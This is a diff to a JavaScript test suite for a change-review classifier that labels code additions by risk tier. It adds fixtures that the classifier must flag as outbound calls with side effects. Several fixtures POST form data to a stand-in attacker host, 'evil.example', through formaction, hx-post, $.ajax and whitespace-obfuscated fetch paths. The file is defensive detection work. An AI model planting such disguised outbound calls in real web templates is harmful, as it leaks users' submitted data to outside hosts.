@@ -447,7 +447,8 @@ test('a deleted source file without removal calls gets no removal-code reason', 
 const outcome = (p, opts) => { const diff = file(p, opts); return riskTier(diff, { readFile: addedAsHead(diff) }); };
 
 test('a form that posts to the app itself is not an outbound call', () => {
-  for (const line of ['<form method="post" action="{{ base }}/dealer/channels">', '<div><form class="x" method=post action="/logout"><button>Log ud</button></form></div>', '<form method="POST">']) {
+  for (const line of ['<form method="post" action="{{ base }}/dealer/channels">', '<div><form class="x" method=post action="/logout"><button>Log ud</button></form></div>', '<form method="POST">',
+    '<form method="post" action="{{ crate::b() }}/dealer/location" class="inline"{% if back == "welcome" %} hx-post="{{ crate::b() }}/dealer/location" hx-trigger="change" hx-swap="none"{% endif %}>']) {
     const r = outcome('templates/channels.html', { add: [line] });
     assert.equal(r.tier, 1, `${line}: ${r.reasons.join('; ')}`);
   }
@@ -476,6 +477,22 @@ test('a server-side or absolute write call is still an outbound call', () => {
     ['templates/pay.html', '<form method="post" action=" https://pay.example.com/charge">'],
     ['templates/pay.html', '<form method="post" action="\t//pay.example.com/charge">'],
     ['static/app.js', 'fetch(`/${host}/x`, {method:"POST"})'],
+    ['server/api/charge.post.ts', "await $fetch('/v1/charges', { baseURL: 'https://api.stripe.com', method: 'POST', body })"],
+    ['server/billing.mjs', "await stripe.fetch('/v1/charges', { method: 'POST', body })"],
+    ['server/billing.mjs', "const res = await api.fetch('/hooks/notify', { method: 'DELETE' })"],
+    ['static/app.js', "fetch('/\t/evil.example/x', {method:'POST'})"],
+    ['static/app.js', "fetch('/ /evil.example/x', {method:'POST'})"],
+    ['static/app.js', "fetch('/x', {method:'POST', baseURL: 'https://api.example.com'})"],
+    ['templates/pay.jsx', '<form method="post" action={"https://pay.example.com/charge"}>'],
+    ['templates/pay.jsx', '<form method="post" onSubmit={e => track(e)} action="https://pay.example.com/charge">'],
+    ['templates/pay.html', '<form method="post" data-x="a>b" action="https://pay.example.com/charge">'],
+    ['templates/pay.html', '<form method="post"><button formaction="https://evil.example/x">'],
+    ['templates/pay.html', `<form onsubmit="$.ajax({url:'https://evil.example', method:'POST'}); return false">`],
+    ['templates/pay.html', '<form method="post" action="javascript:go()">'],
+    ['templates/pay.html', '<form method="post" action=https://pay.example.com/charge>'],
+    ['templates/pay.html', '<form method="post" hx-on:submit="send()" action="/x">'],
+    ['templates/pay.html', '<form method="post" action="/x" hx-post="https://evil.example/x">'],
+    ['templates/pay.vue', '<form method="post" :action="url">'],
   ]) {
     const r = outcome(p, { add: [line] });
     assert.ok(r.reasons.includes(`outbound call with side effects: ${p}`), `${line}: ${r.reasons.join('; ')}`);
